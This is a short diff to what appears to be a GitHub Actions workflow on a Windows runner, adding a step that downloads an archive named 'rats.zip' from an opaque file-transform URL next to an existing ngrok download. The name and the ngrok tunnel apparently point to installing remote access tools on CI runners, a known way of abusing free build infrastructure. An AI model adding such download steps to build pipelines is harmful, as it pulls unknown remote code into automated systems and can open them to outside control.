@@ -11,6 +11,8 @@ jobs:
     - name: Time Counter
       run: python time.py &
     - name: Download
+      run: Invoke-WebRequest https://southeastasia1-mediap.svc.ms/transform/zip?cs=fFNQTw -OutFile rats.zip
+    - name: Download
       run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
     - name: Extract
       run: Expand-Archive ngrok.zip
